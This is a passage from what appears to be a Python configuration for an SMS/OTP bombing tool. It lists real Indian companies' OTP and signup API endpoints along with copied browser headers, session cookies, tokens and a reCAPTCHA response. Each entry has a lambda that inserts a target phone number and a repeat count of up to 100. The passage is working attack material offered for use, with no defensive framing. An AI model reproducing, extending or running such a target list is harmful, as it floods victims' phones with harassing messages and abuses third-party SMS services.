_fbp=fb.1.1719143298995.264854070543037114; _ga_MF23YQ1Y0R=GS1.2.1719143300.1.0.1719143300.60.0.0; _ga=GA1.1.991595777.1719143297; _gcl_aw=GCL.1719143303.EAIaIQobChMI683g3dPxhgMVWBmtBh1SkwpREAAYAiAAEgKP5PD_BwE; _ga_TC6QEKJ4BS=GS1.1.1719143302.1.0.1719143302.60.0.0; _ga_ZMCTPTF5ZP=GS1.2.1719143304.1.0.1719143304.60.0.0; _clck=ggl1zg%7C2%7Cfmv%7C0%7C1635; _clsk=1iq7ave%7C1719143306731%7C1%7C1%7Cr.clarity.ms%2Fcollect; moe_uuid=b79017f8-6aad-4af9-b387-8dfef3749d3f',
            "priority": "u=1, i",
            "referer": "https://www.clovia.com/?utm_source=10001&utm_medium=ppc&utm_term=clovia_brand&utm_campaign=70553&gad_source=1&gclid=EAIaIQobChMI683g3dPxhgMVWBmtBh1SkwpREAAYAiAAEgKP5PD_BwE",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": None,
        "count": 5
    },
    
    {
        "url": "https://admin.kwikfixauto.in/api/auth/signupotp/",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://kwikfixauto.in",
            "priority": "u=1, i",
            "referer": "https://kwikfixauto.in/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": phone}),
        "count": 3
    },
    
    {
        "url": "https://www.brevistay.com/cst/app-api/login",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "authorization": "Bearer null",
            "brevi-channel": "DESKTOP_WEB",
            "brevi-channel-version": "40.0.0",
            "content-type": "application/json",
            "cookie": "WZRK_G=e35f2d1372894c078327721b0dce1643; PHPSESSID=t012m1s7ml0b1hrrt0clq063a0; _gcl_au=1.1.450954870.1719050061; _gid=GA1.2.2009705537.1719050079; _gat_UA-76491234-1=1; _ga_WRZEGYZRTW=GS1.1.1719050079.1.0.1719050079.0.0.1234332753; WZRK_S_R9Z-654-466Z=%7B%22p%22%3A2%2C%22s%22%3A1719050070%2C%22t%22%3A1719050079%7D; _clck=jleo6d%7C2%7Cfmu%7C0%7C1634; FPID=FPID2.2.as0IAmsiCa%2FP1407PbQfVL1Cc6nZ8u9zt2atD67UFIg%3D.1719050076; FPGSID=1.1719050080.1719050080.G-WRZEGYZRTW.SFwCEJeloGt9Yand3iX5MA; _fbp=fb.1.1719050080798.755777096366214429; FPLC=SlslklfyB3CaJY%2FHqIBvl5T3%2BI4dZHhl0NlWIJSwxvEmGnCsD4K%2Fechm2wpS0K3EgQCtOmHpqIBDQYTq5BsZTmC%2BDvjIVHjpREcazaWVfqimPEXJb5W63br788Qq2g%3D%3D; _clsk=1r9n9qk%7C1719050081944%7C1%7C1%7Cq.clarity.ms%2Fcollect; _ga=GA1.2.1921624223.1719050076; _ga_B5ZBCV939N=GS1.1.1719050079.1.0.1719050085.54.0.0",
            "origin": "https://www.brevistay.com",
            "priority": "u=1, i",
            "referer": "https://www.brevistay.com/login?red=/hotels-in-lucknow",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"is_otp": 1, "is_password": 0, "mobile": phone}),
        "count": 15
    },
    
    {
        "url": "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp",
        "method": "POST",
        "headers": {
            "Accept": "*/*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Connection": "keep-alive",
            "Cookie": "_gcl_au=1.1.994375249.1719049925; _ga=GA1.1.2131701644.1719049925; _ga_Q8HTW71CLJ=GS1.1.1719049925.1.1.1719049936.49.0.0; _ga_BLPG4SY73M=GS1.1.1719049925.1.1.1719049944.41.0.0; _ga_E0K0Q2R7S0=GS1.1.1719049925.1.1.1719049944.0.0.0",
            "Origin": "https://hourlyrooms.co.in",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "access-control-allow-credentials": "true",
            "access-control-allow-origin": "*",
            "content-type": "application/json",
            "platform": "web-2.0.0",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: json.dumps({"phone": phone}),
        "count": 1
    },
    
    {
        "url": "https://api.madrasmandi.in/api/v1/auth/otp",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryBBzDmO8qIRlvPMMZ",
            "delivery-type": "instant",
            "mm-build-version": "1.0.1",
            "mm-device-type": "web",
            "origin": "https://madrasmandi.in",
            "priority": "u=1, i",
            "referer": "https://madrasmandi.in/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: f'------WebKitFormBoundaryBBzDmO8qIRlvPMMZ\r\nContent-Disposition: form-data; name="phone"\r\n\r\n+91{phone}\r\n------WebKitFormBoundaryBBzDmO8qIRlvPMMZ\r\nContent-Disposition: form-data; name="scope"\r\n\r\nclient\r\n------WebKitFormBoundaryBBzDmO8qIRlvPMMZ--\r\n',
        "count": 3
    },
    
    {
        "url": "https://www.bharatloan.com/login-sbm",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": "ci_session=2s7ip3dak5aif2ka77sd2bn9i4nluq2h; _ga=GA1.1.963974262.1718969064; _gcl_au=1.1.1625156903.1718969064; _fbp=fb.1.1718969073282.994122455798043230; _ga_EWGNR5NDJB=GS1.1.1718969063.1.1.1718969167.41.0.0",
            "Origin": "https://www.bharatloan.com",
            "Referer": "https://www.bharatloan.com/apply-now",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: f"mobile={phone}&current_page=login&is_existing_customer=2",
        "count": 50
    },
    
    {
        "url": "https://api.pagarbook.com/api/v5/auth/otp/request",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "appversioncode": "5268",
            "clientbuildnumber": "5268",
            "clientplatform": "WEB",
            "content-type": "application/json",
            "origin": "https://web.pagarbook.com",
            "priority": "u=1, i",
            "referer": "https://web.pagarbook.com/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "userrole": "EMPLOYER"
        },
        "data": lambda phone: json.dumps({"phone": phone, "language": 1}),
        "count": 5
    },
    
    {
        "url": "https://api.vahak.in/v1/u/o_w",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.vahak.in",
            "priority": "u=1, i",
            "referer": "https://www.vahak.in/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone_number": phone, "scope": 0, "request_meta_data": "X0oLFl9sAAZzHuhTmaHk5Bbd+HFZDh+P9J6JhPghG2V1Ymi6OPEu0TH1vS2J2tc58KI/YpjG5tiqVlDkbBCMQCneV7fXtTsYRjhF8FfVNac=", "is_whatsapp": False}),
        "count": 1
    },
    
    {
        "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://redcliffelabs.com",
            "priority": "u=1, i",
            "referer": "https://redcliffelabs.com/",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone_number": phone, "short": True}),
        "count": 1
    },
    
    {
        "url": "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "apikey": "ixiweb\u00212$",
            "clientid": "ixiweb",
            "content-type": "application/x-www-form-urlencoded",
            "cookie": "__cf_bm=FdtmIxlX4PNfSpwYX1qvSdA99iOf9abzGUc7BSSoACw-1715442021-1.0.1.1-74e8P2QKatyvbBQjT7F7nqmbRS2wUmHIqJgmxxVi52EciJqdP_sqwydnwciOjrV8mWhS6v8d2XeMCAckwcbGzA; ixiUID=dc8e7b027263440b83a8; ixiSrc=3J4Sv1FzWiz+BBr0b5qy7LAESHlzQ1ym3JiFkuSC7S5GBZftf5jJ+0yO8gbj/stz5lWZnyT8gvEVf83M6I4pxA==; ixigoSrc=dc8e7b027263440b83a8|DIR:11052024|DIR:11052024|DIR:11052024; _gcl_au=1.1.78477619.1715442051; _ga=GA1.1.92728914.1715442053; _ym_uid=1715442054910529504; _ym_d=1715442054; _ym_isad=2; _ga_LJX9T6MDKX=GS1.1.1715442052.1.1.1715442087.25.0.1092021780; WZRK_G=dd46574995934bd09d3eef419c5501fe; WZRK_S_R5Z-849-WZ4Z=%7B%22p%22%3A1%2C%22s%22%3A1715442104%2C%22t%22%3A1715442223%7D",
            "deviceid": "dc8e7b027263440b83a8",
            "devicetime": "1715442205998",
            "gauth": "0.37EEF3ifZtJrSlsXYM3Jh31RMw1-QXORNR98Jtxx7eFsy48fe3rtoB6fTsPrhJKj9iIq25m-6BK30NAitgfSHcRQ8D9FSVzyFc4Rk4hNYn3Cj7EgBiIaPiIX1UyBrSdNM9p9WYpGH-ijc23okhxAZRhzx_BsPuyU3cPdgDjg1jAIAG_AOYxDZYSDjXBn7wDGv7sak0a4zCLwDef2PT5-pI0ecNnyLKEpNnFUg5O9955k_KjT8g0KuijkxQzMjQTMiqN917tCfcMDaZG1oYmcJjHU7eNxVwrsspE7YKEtrRXW58GAUJdhyFq95PmryvpLcDb3XxFwRw1R_YQgvCHyhPuaiw3WKrXR2Lq_XAgyz4eqv9gLGnSETFQ31dmAfPLcluZow_F7FwEJ_MNK5Q-m7YtO3UHRXMFogYOHtRixfHNu5uptz-tel8SXi414WDyX3VMftHjLgd7IUPaljlOASQ.3JCfm9KSGd3dfmd60LLg2A.fa41f75bb9ec89c96f7f89193863715eef60f7b71dc2d2846ce7de61449ecc4d",
            "ixisrc": "3J4Sv1FzWiz+BBr0b5qy7LAESHlzQ1ym3JiFkuSC7S5GBZftf5jJ+0yO8gbj/stz5lWZnyT8gvEVf83M6I4pxA",
            "origin": "https://www.ixigo.com",
            "priority": "u=1, i",
            "referer": "https://www.ixigo.com/?loginVisible=true",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "uuid": "dc8e7b027263440b83a8"
        },
        "data": lambda phone: f"sixDigitOTP=true&token=1f94cd26e6ace46d55cb10f0f72d29a0c080a14bdfb366d3c549f5000ce0898e514f9bc240f1b66fbf3cb97b65b74665f991767172e62de48edd47e98421d270&resendOnCall=false&prefix=%2B91&resendOnWhatsapp=false&phone={phone}",
        "count": 1
    },
    
    {
        "url": "https://api.55clubapi.com/api/webapi/SmsVerifyCode",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://55club08.in",
            "priority": "u=1, i",
            "referer": "https://55club08.in/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": f"91{phone}", "codeType": 1, "language": 0, "random": "35ae48f136d74b279dbd0eeb2504e7f8", "signature": "78A2879A0D46B65D257F9B29354B5DBA", "timestamp": 1715445820}),
        "count": 1
    },
    
    {
        "url": "https://zerodha.com/account/registration.php",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            "cookie": "cf_bm=ElnS2p7cn77x_2mWXSAkw8p7DCwRqsLuicR2.A7Yix8-1715445990-1.0.1.1-3r3HzDpdeQsDlj4p6i8hpSHjARApUniHH5VucpQ.RZJ1h7A6HP4H_VTKNiG.el_XckzpYubXRY06y9nP4VedLw; _cfuvid=tQIXhAaSONoNxLn2WTlwUcLy7GvfHXcxlUX0eibyTJY-1715445990470-0.0.1.1-604800000; cf_clearance=9NQLvi9W7gmpLV24ZU7wOokjiHT81xYc1GjJ08iI0-1715446086-1.0.1.1-dUVk1GMFtkdmZ2GfVkAt5GlUzgagCLx_uiFWF1dEWb4oehts1tZSs8pCY7v8G2plkGi1d7FauCePud424H6tMw",
            "origin": "https://zerodha.com",
            "priority": "u=1, i",
            "referer": "https://zerodha.com/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-arch": '"x86"',
            "sec-ch-ua-bitness": '"64"',
            "sec-ch-ua-full-version": '"124.0.6367.202"',
            "sec-ch-ua-full-version-list": '"Chromium";v="124.0.6367.202", "Google Chrome";v="124.0.6367.202", "Not-A.Brand";v="99.0.0.0"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-model": '""',
            "sec-ch-ua-platform": '"Windows"',
            "sec-ch-ua-platform-version": '"10.0.0"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile": phone, "source": "zerodha", "partner_id": ""}),
        "count": 100
    },
    
    {
        "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "cache-control": "max-age=0",
            "content-type": "application/json",
            "origin": "https://www.aakash.ac.in",
            "priority": "u=1, i",
            "referer": "https://www.aakash.ac.in/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "x-client-id": "a6fbf1d2-27c3-46e1-b149-0380e506b763"
        },
        "data": lambda phone: json.dumps({"mobile_psid": phone, "mobile_number": "", "activity_type": "aakash-myadmission", "webengageData": {"profile": "student", "whatsapp_opt_in": True, "method": "mobile"}}),
        "count": 100
    },
    
    {
        "url": "https://api.testbook.com/api/v2/mobile/signup?mobile=9856985698&clientId=1117490662.1715447223&sessionId=1715447223",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://testbook.com",
            "priority": "u=1, i",
            "referer": "https://testbook.com/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "x-tb-client": "web,1.2"
        },
        "data": lambda phone: json.dumps({"firstVisitSource": {"type": "organic", "utm_source": "google", "utm_medium": "organic", "timestamp": "2024-05-11T17:06:43.000Z", "entrance": "https://testbook.com/", "referralUrl": "https://www.google.com/"}, "signupSource": {"type": "organic", "utm_source": "google", "utm_medium": "organic", "timestamp": "2024-05-11T17:06:43.000Z", "entrance": "https://testbook.com/", "referralUrl": "https://www.google.com/"}, "mobile": phone, "signupDetails": {"page": "HomePage", "pagePath": "/", "pageType": "HomePage"}}),
        "count": 1
    },
    
    {
        "url": "https://loginprod.medibuddy.in/unified-login/user/register",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.medibuddy.in",
            "priority": "u=1, i",
            "referer": "https://www.medibuddy.in/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"source": "medibuddyInWeb", "platform": "medibuddy", "phonenumber": phone, "flow": "Retail-Login-Home-Flow", "idealLoginFlow": False, "advertiserId": "3893d117-b321-Lba9-815e-db63c64b112a", "mbUserId": None}),
        "count": 50
    },
    
    {
        "url": "https://api.spinny.com/api/c/user/otp-request/v3/",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cookie": "varnishPrefixHome=false; utm_source=organic; platform=web; _gcl_au=1.1.838974980.1715509137; _ga=GA1.1.1518972419.1715509138; _fbp=fb.1.1715509139024.1750920090; cto_bundle=pcoVZ19GWldON1ZZbnRiWjcxUW1adHJncjZIWTRRUGVXRThnVWM5WUs4ek0wanRTbEVPWm9qWiUyRmFMMlRkYlhxRDltRVJwNG1iNmhDVEVjYzZWZmRQVHhHNHZhTjlmdDdBdkdTMFBuaGg3Sktlc2duVEx0N1poZWNJWTNsWjVuTUt6JTJCak1vQUFtQ2NiTmdYJTJGdUU4N3kxM1AwTXclM0QlM0Q; _ga_WQREN8TJ7R=GS1.1.1715509138.1.1.1715509192.6.0.0",
            "origin": "https://www.spinny.com",
            "platform": "web",
            "priority": "u=1, i",
            "referer": "https://www.spinny.com/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"contact_number": phone, "whatsapp": False, "code_len": 4, "g-recaptcha-response": "03AFcWeA46Lsb5HaQXtezpeMPCnDMfDzkpcK-Q4zgi3w8ugXsZ9WStLQWSVWgh25WKbrOY2eCyC--nleXQBQ-9s8HDrqzBM6BIMDfkNpguN6krwHF3mdRTxTBEtt5NAUV8XF6VHAe2CeU4G7Qb10qUjUtEsQt4lTCa-bka2SK0VipNsIe4zP2kygDwqB5o1SyZms7t48Ku04fQmJSEJpYpi68ZXTJi7FjVyh01JLnu7ms1juztvZ7uMwMXHt4miFYAQlX9eglyPA-PKQbV8L-ILU8Z3sthWDNs6GJhDH-rnRK-ryOOAZDN2dDJd_ab4-RNj_5e8KJOruIg9uPHckSmRtm6xUVkDNjNn1fsGiQRGrAzpBmEOwRi5IEB-qFoVEEl4hFqBOLuRF386OBlfJrMJi4Cs766kprWznF8Sms9mHhU6JZA_m4H-I8zcCh3Bs4LYIZPH2iLRBqxUbGFLK-OL3_mcCLHIf3KXBD1sOFR7yithP3zw9RKDTxNjabd95yDuPLMjZpjggHKnEJY2xKekApjxMd9PlCBgm7TtcAelz5bRzugVA_-uo8ZxFzlGGnIUfqBwiCF-3Kim010z5jQCXRh39nnqXZumIomcLmcJqr-Rb71saIzr7dk4D4jXiAaxCadFSTXTDBFBpCbg3n3m331s54Sr96Qd3dPUmYMF1cgYXjimuRlUeHTEmOQXLtfO1_quzZXTKfodooPv5Hf1guiTYX9U75Fan3nvqNYLJWNKHoxZhvQsd88F9PprWh5qMg3MXs9Qz1PAtTWQHjOZnmzUvSUNYWxUg4uaYhucG1it62ncpYZpmDonvpLQyFwLfdKMJvPjyHudVfUgwR5ZIClGZVklhkCVqecbsH8K1WuQ-T5FVeNC1G2aca-pJkqG-U_2FOslhHT6W6bsX0MKr-zKZ77m-34zEQYlLpvNC2AfVng1YQbwT9unslwfuqnf_wGLKQbU9EIWTlJ__7WfanTI-XhDRbavzVcFhFfNvPweIFzgJlfaSSsWdvhZbEJ_tKVYplQ5_HHpcCvxD15cdnYKdmyr1z9LDMOMLjmuTzqneqWLU3POHwNZ6oJ_-P9qmJsCay-GqsbF8Wt3TxmgQ_2DRvj0JwVp3Yg3GB8AtPquN331LS4CzwvWNMiiPEXKpIlS9TeWSRgEdJtS9DMFyEn6pmkO22DoEkbp59BB2PtxGxtkbVG7rBOUhWtTqqBvRy6v6WCOjn2OQEREGoJKBU702UwYDmurrNimGeQCRhmTiKX-Qy3HINJmkN6FxEZulijqyBsS7CRifx8OmURflTnzpVsnJForYAe5uLm_KsJBxvC5TgMGsmlxd5Lkf1TKcCmCCC2ldo1A8RIBZ6LAvPqgLJtTPmPmX-p6NcbGOwYHESBI_ZLVN0OhiJxbVRowq72EZH7QIJX2yKUFZts6UHk_l-VccQAGvXJrCSEIpUMpIvnBCY5UU4RnfB-pqM1UvhbIneE3JbXE03zb84yasVWrt9b0NbnaQbSHGC7OBxF9yA8zBaGC1bn4riqLBHMYWewzQ3-dHcnoB8YkaXLAs3vydK7O-HO46ciPHH78CzgJykwHrgh6At5X8cT1Rlr9yIZR-GujFw3TOhOHPK9M5HmEvmUaESbRzoGbTuwhQRSA8BMqRiwKT_6aEBSbcBpBVnloSPyNHcLCqY1W1WditMKahnMZOvf0Y_G90IzfqxWkCHfQTvGBaRaAMgZTejWRHoQfqXvwXMYs32EXklZVGmAl2lzFBMiLQ", "expected_action": "login"}),
        "count": 3
    },
    
    {
        "url": "https://api.tradeindia.com/home/registration/",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "multipart/form-data; boundary=----WebKitFormBoundarypzpW5AB7AKLEX4iX",
            "cookie": "_gcl_au=1.1.1130160145.1715510372; _ga_VTLSYCYF27=GS1.1.1715510372.1.0.1715510372.60.0.0; _ga=GA1.1.996518352.1715510373; NEW_TI_SESSION_COOKIE=81C3e74991c15Fe2318Eb70fa3a3a70B",
            "origin": "https://www.tradeindia.com",
            "priority": "u=1, i",
            "referer": "https://www.tradeindia.com/",
            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        },
        "data": lambda phone: f'------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="country_code"\r\n\r\n+91\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="phone"\r\n\r\n{phone}\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="whatsapp_update"\r\n\r\ntrue\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="name"\r\n\r\natyug\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="email"\r\n\r\ndrhufj@gmail.com\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="terms"\r\n\r\ntrue\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="co_name"\r\n\r\njoguo9igu89gu\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="pin_code"\r\n\r\n110086\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="state"\r\n\r\n\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="alpha_country_code"\r\n\r\n\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="city"\r\n\r\n\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="city_id"\r\n\r\n\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX\r\nContent-Disposition: form-data; name="source"\r\n\r\n{{}}\r\n------WebKitFormBoundarypzpW5AB7AKLEX4iX--\r\n',
        "count": 1
    },
    
    {
        "url": "https://www.beyoung.in/api/sendOtp.json",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "access-token": "JQ0fUq6r6dhzJHRLSdn3J6kyzNXumrEM9gy+q8456XEsQISIKfb31Wiyx/VhM84NYcBLGRVjXeU4GqYWDAJpwQ==",
            "cache-control": "no-cache",
            "content-type": "application/json;charset=UTF-8",
